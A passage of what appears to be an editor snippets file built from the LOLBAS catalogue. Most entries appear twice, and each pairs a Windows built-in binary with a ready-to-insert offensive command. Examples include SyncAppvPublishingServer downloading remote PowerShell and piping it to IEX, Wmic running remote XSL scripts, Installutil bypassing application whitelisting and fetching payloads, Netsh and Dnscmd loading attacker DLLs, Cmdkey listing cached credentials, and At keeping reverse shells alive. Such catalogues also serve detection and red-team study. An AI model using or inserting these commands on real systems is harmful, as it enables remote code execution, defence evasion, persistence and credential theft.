            "wmic.exe process get brief /format:\"{REMOTEURL:.xsl}\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Create a volume shadow copy of NTDS.dit that can be copied., requires  privilege, category: Execute, it can be used for Execute binary on remote system."
    },
    "Wmic.exe Execute script from remote system (lolbas)": {
        "prefix": "Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Executes JScript or VBScript embedded in the target remote XSL stylsheet., requires  privilege, category: Execute, it can be used for Execute script from remote system.",
            "",
            "```sh",
            "wmic.exe process get brief /format:\"{PATH_SMB:.xsl}\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Executes JScript or VBScript embedded in the target remote XSL stylsheet., requires  privilege, category: Execute, it can be used for Execute script from remote system."
    },
    "lolbas Wmic.exe Execute script from remote system": {
        "prefix": "lolbas Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Executes JScript or VBScript embedded in the target remote XSL stylsheet., requires  privilege, category: Execute, it can be used for Execute script from remote system.",
            "",
            "```sh",
            "wmic.exe process get brief /format:\"{PATH_SMB:.xsl}\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Executes JScript or VBScript embedded in the target remote XSL stylsheet., requires  privilege, category: Execute, it can be used for Execute script from remote system."
    },
    "Wmic.exe Copy file. (lolbas)": {
        "prefix": "Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Copy file from source to destination., requires  privilege, category: Copy, it can be used for Copy file..",
            "",
            "```sh",
            "wmic.exe datafile where \"Name='C:\\\\windows\\\\system32\\\\calc.exe'\" call Copy \"C:\\\\users\\\\public\\\\calc.exe\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Copy file from source to destination., requires  privilege, category: Copy, it can be used for Copy file.."
    },
    "lolbas Wmic.exe Copy file.": {
        "prefix": "lolbas Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Copy file from source to destination., requires  privilege, category: Copy, it can be used for Copy file..",
            "",
            "```sh",
            "wmic.exe datafile where \"Name='C:\\\\windows\\\\system32\\\\calc.exe'\" call Copy \"C:\\\\users\\\\public\\\\calc.exe\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Copy file from source to destination., requires  privilege, category: Copy, it can be used for Copy file.."
    },
    "Runonce.exe Persistence, bypassing defensive counter measures (lolbas)": {
        "prefix": "Runonce.exe",
        "body": [
            "Runonce.exe is Executes a Run Once Task that has been configured in the registry. it can Executes a Run Once Task that has been configured in the registry., requires  privilege, category: Execute, it can be used for Persistence, bypassing defensive counter measures.",
            "",
            "```sh",
            "Runonce.exe /AlternateShellStartup${0}",
            "```"
        ],
        "description": "Runonce.exe is Executes a Run Once Task that has been configured in the registry. it can Executes a Run Once Task that has been configured in the registry., requires  privilege, category: Execute, it can be used for Persistence, bypassing defensive counter measures."
    },
    "lolbas Runonce.exe Persistence, bypassing defensive counter measures": {
        "prefix": "lolbas Runonce.exe",
        "body": [
            "Runonce.exe is Executes a Run Once Task that has been configured in the registry. it can Executes a Run Once Task that has been configured in the registry., requires  privilege, category: Execute, it can be used for Persistence, bypassing defensive counter measures.",
            "",
            "```sh",
            "Runonce.exe /AlternateShellStartup${0}",
            "```"
        ],
        "description": "Runonce.exe is Executes a Run Once Task that has been configured in the registry. it can Executes a Run Once Task that has been configured in the registry., requires  privilege, category: Execute, it can be used for Persistence, bypassing defensive counter measures."
    },
    "SyncAppvPublishingServer.exe Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures (lolbas)": {
        "prefix": "SyncAppvPublishingServer.exe",
        "body": [
            "SyncAppvPublishingServer.exe is Used by App-v to get App-v server lists. it can Example command on how inject Powershell code into the process, requires  privilege, category: Execute, it can be used for Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures.",
            "",
            "```sh",
            "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"${0}",
            "```"
        ],
        "description": "SyncAppvPublishingServer.exe is Used by App-v to get App-v server lists. it can Example command on how inject Powershell code into the process, requires  privilege, category: Execute, it can be used for Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures."
    },
    "lolbas SyncAppvPublishingServer.exe Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures": {
        "prefix": "lolbas SyncAppvPublishingServer.exe",
        "body": [
            "SyncAppvPublishingServer.exe is Used by App-v to get App-v server lists. it can Example command on how inject Powershell code into the process, requires  privilege, category: Execute, it can be used for Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures.",
            "",
            "```sh",
            "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"${0}",
            "```"
        ],
        "description": "SyncAppvPublishingServer.exe is Used by App-v to get App-v server lists. it can Example command on how inject Powershell code into the process, requires  privilege, category: Execute, it can be used for Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures."
    },
    "Verclsid.exe Run a COM object created in registry to evade defensive counter measures (lolbas)": {
        "prefix": "Verclsid.exe",
        "body": [
            "Verclsid.exe is Used to verify a COM object before it is instantiated by Windows Explorer. it can Used to verify a COM object before it is instantiated by Windows Explorer, requires  privilege, category: Execute, it can be used for Run a COM object created in registry to evade defensive counter measures.",
            "",
            "```sh",
            "verclsid.exe /S /C {CLSID}${0}",
            "```"
        ],
        "description": "Verclsid.exe is Used to verify a COM object before it is instantiated by Windows Explorer. it can Used to verify a COM object before it is instantiated by Windows Explorer, requires  privilege, category: Execute, it can be used for Run a COM object created in registry to evade defensive counter measures."
    },
    "lolbas Verclsid.exe Run a COM object created in registry to evade defensive counter measures": {
        "prefix": "lolbas Verclsid.exe",
        "body": [
            "Verclsid.exe is Used to verify a COM object before it is instantiated by Windows Explorer. it can Used to verify a COM object before it is instantiated by Windows Explorer, requires  privilege, category: Execute, it can be used for Run a COM object created in registry to evade defensive counter measures.",
            "",
            "```sh",
            "verclsid.exe /S /C {CLSID}${0}",
            "```"
        ],
        "description": "Verclsid.exe is Used to verify a COM object before it is instantiated by Windows Explorer. it can Used to verify a COM object before it is instantiated by Windows Explorer, requires  privilege, category: Execute, it can be used for Run a COM object created in registry to evade defensive counter measures."
    },
    "Psr.exe Can be used to take screenshots of the user environment (lolbas)": {
        "prefix": "Psr.exe",
        "body": [
            "Psr.exe is Windows Problem Steps Recorder, used to record screen and clicks.. it can Record a user screen without creating a GUI. You should use \"psr.exe /stop\" to stop recording and create output file., requires  privilege, category: Reconnaissance, it can be used for Can be used to take screenshots of the user environment.",
            "",
            "```sh",
            "psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0${0}",
            "```"
        ],
        "description": "Psr.exe is Windows Problem Steps Recorder, used to record screen and clicks.. it can Record a user screen without creating a GUI. You should use \"psr.exe /stop\" to stop recording and create output file., requires  privilege, category: Reconnaissance, it can be used for Can be used to take screenshots of the user environment."
    },
    "lolbas Psr.exe Can be used to take screenshots of the user environment": {
        "prefix": "lolbas Psr.exe",
        "body": [
            "Psr.exe is Windows Problem Steps Recorder, used to record screen and clicks.. it can Record a user screen without creating a GUI. You should use \"psr.exe /stop\" to stop recording and create output file., requires  privilege, category: Reconnaissance, it can be used for Can be used to take screenshots of the user environment.",
            "",
            "```sh",
            "psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0${0}",
            "```"
        ],
        "description": "Psr.exe is Windows Problem Steps Recorder, used to record screen and clicks.. it can Record a user screen without creating a GUI. You should use \"psr.exe /stop\" to stop recording and create output file., requires  privilege, category: Reconnaissance, it can be used for Can be used to take screenshots of the user environment."
    },
    "Infdefaultinstall.exe Code execution (lolbas)": {
        "prefix": "Infdefaultinstall.exe",
        "body": [
            "Infdefaultinstall.exe is Binary used to perform installation based on content inside inf files. it can Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file., requires  privilege, category: Execute, it can be used for Code execution.",
            "",
            "```sh",
            "InfDefaultInstall.exe {PATH:.inf}${0}",
            "```"
        ],
        "description": "Infdefaultinstall.exe is Binary used to perform installation based on content inside inf files. it can Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file., requires  privilege, category: Execute, it can be used for Code execution."
    },
    "lolbas Infdefaultinstall.exe Code execution": {
        "prefix": "lolbas Infdefaultinstall.exe",
        "body": [
            "Infdefaultinstall.exe is Binary used to perform installation based on content inside inf files. it can Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file., requires  privilege, category: Execute, it can be used for Code execution.",
            "",
            "```sh",
            "InfDefaultInstall.exe {PATH:.inf}${0}",
            "```"
        ],
        "description": "Infdefaultinstall.exe is Binary used to perform installation based on content inside inf files. it can Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file., requires  privilege, category: Execute, it can be used for Code execution."
    },
    "Explorer.exe Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion. (lolbas)": {
        "prefix": "Explorer.exe",
        "body": [
            "Explorer.exe is Binary used for managing files and system components within Windows. it can Execute notepad.exe with the parent process spawning from a new instance of explorer.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion..",
            "",
            "```sh",
            "explorer.exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Explorer.exe is Binary used for managing files and system components within Windows. it can Execute notepad.exe with the parent process spawning from a new instance of explorer.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.."
    },
    "lolbas Explorer.exe Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.": {
        "prefix": "lolbas Explorer.exe",
        "body": [
            "Explorer.exe is Binary used for managing files and system components within Windows. it can Execute notepad.exe with the parent process spawning from a new instance of explorer.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion..",
            "",
            "```sh",
            "explorer.exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Explorer.exe is Binary used for managing files and system components within Windows. it can Execute notepad.exe with the parent process spawning from a new instance of explorer.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.."
    },
    "Expand.exe Use to copies the source file to the destination file (lolbas)": {
        "prefix": "Expand.exe",
        "body": [
            "Expand.exe is Binary that expands one or more compressed files. it can Copies source file to destination., requires  privilege, category: Download, it can be used for Use to copies the source file to the destination file.",
            "",
            "```sh",
            "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}${0}",
            "```"
        ],
        "description": "Expand.exe is Binary that expands one or more compressed files. it can Copies source file to destination., requires  privilege, category: Download, it can be used for Use to copies the source file to the destination file."
    },
    "lolbas Expand.exe Use to copies the source file to the destination file": {
        "prefix": "lolbas Expand.exe",
        "body": [
            "Expand.exe is Binary that expands one or more compressed files. it can Copies source file to destination., requires  privilege, category: Download, it can be used for Use to copies the source file to the destination file.",
            "",
            "```sh",
            "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}${0}",
            "```"
        ],
        "description": "Expand.exe is Binary that expands one or more compressed files. it can Copies source file to destination., requires  privilege, category: Download, it can be used for Use to copies the source file to the destination file."
    },
    "Expand.exe Copies files from A to B (lolbas)": {
        "prefix": "Expand.exe",
        "body": [
            "Expand.exe is Binary that expands one or more compressed files. it can Copies source file to destination Alternate Data Stream (ADS), requires  privilege, category: ADS, it can be used for Copies files from A to B.",
            "",
            "```sh",
            "expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat${0}",
            "```"
        ],
        "description": "Expand.exe is Binary that expands one or more compressed files. it can Copies source file to destination Alternate Data Stream (ADS), requires  privilege, category: ADS, it can be used for Copies files from A to B."
    },
    "lolbas Expand.exe Copies files from A to B": {
        "prefix": "lolbas Expand.exe",
        "body": [
            "Expand.exe is Binary that expands one or more compressed files. it can Copies source file to destination Alternate Data Stream (ADS), requires  privilege, category: ADS, it can be used for Copies files from A to B.",
            "",
            "```sh",
            "expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat${0}",
            "```"
        ],
        "description": "Expand.exe is Binary that expands one or more compressed files. it can Copies source file to destination Alternate Data Stream (ADS), requires  privilege, category: ADS, it can be used for Copies files from A to B."
    },
    "Installutil.exe Use to execute code and bypass application whitelisting (lolbas)": {
        "prefix": "Installutil.exe",
        "body": [
            "Installutil.exe is The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. it can Execute the target .NET DLL or EXE., requires  privilege, category: Execute, it can be used for Use to execute code and bypass application whitelisting.",
            "",
            "```sh",
            "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}${0}",
            "```"
        ],
        "description": "Installutil.exe is The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. it can Execute the target .NET DLL or EXE., requires  privilege, category: Execute, it can be used for Use to execute code and bypass application whitelisting."
    },
    "lolbas Installutil.exe Use to execute code and bypass application whitelisting": {
        "prefix": "lolbas Installutil.exe",
        "body": [
            "Installutil.exe is The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. it can Execute the target .NET DLL or EXE., requires  privilege, category: Execute, it can be used for Use to execute code and bypass application whitelisting.",
            "",
            "```sh",
            "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}${0}",
            "```"
        ],
        "description": "Installutil.exe is The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. it can Execute the target .NET DLL or EXE., requires  privilege, category: Execute, it can be used for Use to execute code and bypass application whitelisting."
    },
    "Installutil.exe Downloads payload from remote server (lolbas)": {
        "prefix": "Installutil.exe",
        "body": [
            "Installutil.exe is The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server.",
            "",
            "```sh",
            "InstallUtil.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Installutil.exe is The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server."
    },
    "lolbas Installutil.exe Downloads payload from remote server": {
        "prefix": "lolbas Installutil.exe",
        "body": [
            "Installutil.exe is The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server.",
            "",
            "```sh",
            "InstallUtil.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Installutil.exe is The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server."
    },
    "Netsh.exe Proxy execution of .dll (lolbas)": {
        "prefix": "Netsh.exe",
        "body": [
            "Netsh.exe is Netsh is a Windows tool used to manipulate network interface settings.. it can Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called, requires  privilege, category: Execute, it can be used for Proxy execution of .dll.",
            "",
            "```sh",
            "netsh.exe add helper {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "Netsh.exe is Netsh is a Windows tool used to manipulate network interface settings.. it can Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called, requires  privilege, category: Execute, it can be used for Proxy execution of .dll."
    },
    "lolbas Netsh.exe Proxy execution of .dll": {
        "prefix": "lolbas Netsh.exe",
        "body": [
            "Netsh.exe is Netsh is a Windows tool used to manipulate network interface settings.. it can Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called, requires  privilege, category: Execute, it can be used for Proxy execution of .dll.",
            "",
            "```sh",
            "netsh.exe add helper {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "Netsh.exe is Netsh is a Windows tool used to manipulate network interface settings.. it can Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called, requires  privilege, category: Execute, it can be used for Proxy execution of .dll."
    },
    "Provlaunch.exe Executes arbitrary command (lolbas)": {
        "prefix": "Provlaunch.exe",
        "body": [
            "Provlaunch.exe is Launcher process. it can Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution., requires  privilege, category: Execute, it can be used for Executes arbitrary command.",
            "",
            "```sh",
            "provlaunch.exe LOLBin${0}",
            "```"
        ],
        "description": "Provlaunch.exe is Launcher process. it can Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution., requires  privilege, category: Execute, it can be used for Executes arbitrary command."
    },
    "lolbas Provlaunch.exe Executes arbitrary command": {
        "prefix": "lolbas Provlaunch.exe",
        "body": [
            "Provlaunch.exe is Launcher process. it can Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution., requires  privilege, category: Execute, it can be used for Executes arbitrary command.",
            "",
            "```sh",
            "provlaunch.exe LOLBin${0}",
            "```"
        ],
        "description": "Provlaunch.exe is Launcher process. it can Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution., requires  privilege, category: Execute, it can be used for Executes arbitrary command."
    },
    "Wab.exe Execute dll file. Bypass defensive counter measures (lolbas)": {
        "prefix": "Wab.exe",
        "body": [
            "Wab.exe is Windows address book manager. it can Change HKLM\\Software\\Microsoft\\WAB\\DLLPath and execute DLL of choice, requires  privilege, category: Execute, it can be used for Execute dll file. Bypass defensive counter measures.",
            "",
            "```sh",
            "wab.exe${0}",
            "```"
        ],
        "description": "Wab.exe is Windows address book manager. it can Change HKLM\\Software\\Microsoft\\WAB\\DLLPath and execute DLL of choice, requires  privilege, category: Execute, it can be used for Execute dll file. Bypass defensive counter measures."
    },
    "lolbas Wab.exe Execute dll file. Bypass defensive counter measures": {
        "prefix": "lolbas Wab.exe",
        "body": [
            "Wab.exe is Windows address book manager. it can Change HKLM\\Software\\Microsoft\\WAB\\DLLPath and execute DLL of choice, requires  privilege, category: Execute, it can be used for Execute dll file. Bypass defensive counter measures.",
            "",
            "```sh",
            "wab.exe${0}",
            "```"
        ],
        "description": "Wab.exe is Windows address book manager. it can Change HKLM\\Software\\Microsoft\\WAB\\DLLPath and execute DLL of choice, requires  privilege, category: Execute, it can be used for Execute dll file. Bypass defensive counter measures."
    },
    "Dnscmd.exe Remotely inject dll to dns server (lolbas)": {
        "prefix": "Dnscmd.exe",
        "body": [
            "Dnscmd.exe is A command-line interface for managing DNS servers. it can Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details., requires  privilege, category: Execute, it can be used for Remotely inject dll to dns server.",
            "",
            "```sh",
            "dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}${0}",
            "```"
        ],
        "description": "Dnscmd.exe is A command-line interface for managing DNS servers. it can Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details., requires  privilege, category: Execute, it can be used for Remotely inject dll to dns server."
    },
    "lolbas Dnscmd.exe Remotely inject dll to dns server": {
        "prefix": "lolbas Dnscmd.exe",
        "body": [
            "Dnscmd.exe is A command-line interface for managing DNS servers. it can Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details., requires  privilege, category: Execute, it can be used for Remotely inject dll to dns server.",
            "",
            "```sh",
            "dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}${0}",
            "```"
        ],
        "description": "Dnscmd.exe is A command-line interface for managing DNS servers. it can Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details., requires  privilege, category: Execute, it can be used for Remotely inject dll to dns server."
    },
    "At.exe Create a recurring task, to eg. to keep reverse shell session(s) alive (lolbas)": {
        "prefix": "At.exe",
        "body": [
            "At.exe is Schedule periodic tasks. it can Create a recurring task to execute every day at a specific time., requires  privilege, category: Execute, it can be used for Create a recurring task, to eg. to keep reverse shell session(s) alive.",
            "",
            "```sh",
            "C:\\Windows\\System32\\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}${0}",
            "```"
        ],
        "description": "At.exe is Schedule periodic tasks. it can Create a recurring task to execute every day at a specific time., requires  privilege, category: Execute, it can be used for Create a recurring task, to eg. to keep reverse shell session(s) alive."
    },
    "lolbas At.exe Create a recurring task, to eg. to keep reverse shell session(s) alive": {
        "prefix": "lolbas At.exe",
        "body": [
            "At.exe is Schedule periodic tasks. it can Create a recurring task to execute every day at a specific time., requires  privilege, category: Execute, it can be used for Create a recurring task, to eg. to keep reverse shell session(s) alive.",
            "",
            "```sh",
            "C:\\Windows\\System32\\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}${0}",
            "```"
        ],
        "description": "At.exe is Schedule periodic tasks. it can Create a recurring task to execute every day at a specific time., requires  privilege, category: Execute, it can be used for Create a recurring task, to eg. to keep reverse shell session(s) alive."
    },
    "Pcalua.exe Proxy execution of binary (lolbas)": {
        "prefix": "Pcalua.exe",
        "body": [
            "Pcalua.exe is Program Compatibility Assistant. it can Open the target .EXE using the Program Compatibility Assistant., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "pcalua.exe -a {PATH:.exe}${0}",
            "```"
        ],
        "description": "Pcalua.exe is Program Compatibility Assistant. it can Open the target .EXE using the Program Compatibility Assistant., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "lolbas Pcalua.exe Proxy execution of binary": {
        "prefix": "lolbas Pcalua.exe",
        "body": [
            "Pcalua.exe is Program Compatibility Assistant. it can Open the target .EXE using the Program Compatibility Assistant., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "pcalua.exe -a {PATH:.exe}${0}",
            "```"
        ],
        "description": "Pcalua.exe is Program Compatibility Assistant. it can Open the target .EXE using the Program Compatibility Assistant., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "Pcalua.exe Proxy execution of remote dll file (lolbas)": {
        "prefix": "Pcalua.exe",
        "body": [
            "Pcalua.exe is Program Compatibility Assistant. it can Open the target .DLL file with the Program Compatibilty Assistant., requires  privilege, category: Execute, it can be used for Proxy execution of remote dll file.",
            "",
            "```sh",
            "pcalua.exe -a {PATH_SMB:.dll}${0}",
            "```"
        ],
        "description": "Pcalua.exe is Program Compatibility Assistant. it can Open the target .DLL file with the Program Compatibilty Assistant., requires  privilege, category: Execute, it can be used for Proxy execution of remote dll file."
    },
    "lolbas Pcalua.exe Proxy execution of remote dll file": {
        "prefix": "lolbas Pcalua.exe",
        "body": [
            "Pcalua.exe is Program Compatibility Assistant. it can Open the target .DLL file with the Program Compatibilty Assistant., requires  privilege, category: Execute, it can be used for Proxy execution of remote dll file.",
            "",
            "```sh",
            "pcalua.exe -a {PATH_SMB:.dll}${0}",
            "```"
        ],
        "description": "Pcalua.exe is Program Compatibility Assistant. it can Open the target .DLL file with the Program Compatibilty Assistant., requires  privilege, category: Execute, it can be used for Proxy execution of remote dll file."
    },
    "Pcalua.exe Execution of CPL files (lolbas)": {
        "prefix": "Pcalua.exe",
        "body": [
            "Pcalua.exe is Program Compatibility Assistant. it can Open the target .CPL file with the Program Compatibility Assistant., requires  privilege, category: Execute, it can be used for Execution of CPL files.",
            "",
            "```sh",
            "pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java${0}",
            "```"
        ],
        "description": "Pcalua.exe is Program Compatibility Assistant. it can Open the target .CPL file with the Program Compatibility Assistant., requires  privilege, category: Execute, it can be used for Execution of CPL files."
    },
    "lolbas Pcalua.exe Execution of CPL files": {
        "prefix": "lolbas Pcalua.exe",
        "body": [
            "Pcalua.exe is Program Compatibility Assistant. it can Open the target .CPL file with the Program Compatibility Assistant., requires  privilege, category: Execute, it can be used for Execution of CPL files.",
            "",
            "```sh",
            "pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java${0}",
            "```"
        ],
        "description": "Pcalua.exe is Program Compatibility Assistant. it can Open the target .CPL file with the Program Compatibility Assistant., requires  privilege, category: Execute, it can be used for Execution of CPL files."
    },
    "Cmdkey.exe Get credential information from host (lolbas)": {
        "prefix": "Cmdkey.exe",
        "body": [
            "Cmdkey.exe is creates, lists, and deletes stored user names and passwords or credentials.. it can List cached credentials, requires  privilege, category: Credentials, it can be used for Get credential information from host.",
            "",
            "```sh",
            "cmdkey /list${0}",
            "```"
        ],
        "description": "Cmdkey.exe is creates, lists, and deletes stored user names and passwords or credentials.. it can List cached credentials, requires  privilege, category: Credentials, it can be used for Get credential information from host."
    },
    "lolbas Cmdkey.exe Get credential information from host": {
        "prefix": "lolbas Cmdkey.exe",
        "body": [
            "Cmdkey.exe is creates, lists, and deletes stored user names and passwords or credentials.. it can List cached credentials, requires  privilege, category: Credentials, it can be used for Get credential information from host.",
            "",
            "```sh",
            "cmdkey /list${0}",
            "```"
        ],
        "description": "Cmdkey.exe is creates, lists, and deletes stored user names and passwords or credentials.. it can List cached credentials, requires  privilege, category: Credentials, it can be used for Get credential information from host."
    },
    "Msconfig.exe Code execution using Msconfig.exe (lolbas)": {
        "prefix": "Msconfig.exe",
        "body": [
            "Msconfig.exe is MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows. it can Executes command embeded in crafted c:\\windows\\system32\\mscfgtlc.xml., requires  privilege, category: Execute, it can be used for Code execution using Msconfig.exe.",
            "",
            "```sh",
            "Msconfig.exe -5${0}",
            "```"
        ],
        "description": "Msconfig.exe is MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows. it can Executes command embeded in crafted c:\\windows\\system32\\mscfgtlc.xml., requires  privilege, category: Execute, it can be used for Code execution using Msconfig.exe."
    },
    "lolbas Msconfig.exe Code execution using Msconfig.exe": {
        "prefix": "lolbas Msconfig.exe",
        "body": [
            "Msconfig.exe is MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows. it can Executes command embeded in crafted c:\\windows\\system32\\mscfgtlc.xml., requires  privilege, category: Execute, it can be used for Code execution using Msconfig.exe.",
            "",
            "```sh",
            "Msconfig.exe -5${0}",
            "```"
        ],
        "description": "Msconfig.exe is MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows. it can Executes command embeded in crafted c:\\windows\\system32\\mscfgtlc.xml., requires  privilege, category: Execute, it can be used for Code execution using Msconfig.exe."
    },
    "Ldifde.exe Download file from Internet (lolbas)": {
        "prefix": "Ldifde.exe",
        "body": [
            "Ldifde.exe is Creates, modifies, and deletes LDAP directory objects.. it can Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as thumbnailPhoto:< http://example.org/somefile.txt, the file will be downloaded into IE temp folder., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "Ldifde -i -f {PATH:.ldf}${0}",
            "```"
        ],
        "description": "Ldifde.exe is Creates, modifies, and deletes LDAP directory objects.. it can Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as thumbnailPhoto:< http://example.org/somefile.txt, the file will be downloaded into IE temp folder., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "lolbas Ldifde.exe Download file from Internet": {
        "prefix": "lolbas Ldifde.exe",
        "body": [
            "Ldifde.exe is Creates, modifies, and deletes LDAP directory objects.. it can Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as thumbnailPhoto:< http://example.org/somefile.txt, the file will be downloaded into IE temp folder., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "Ldifde -i -f {PATH:.ldf}${0}",
            "```"
        ],
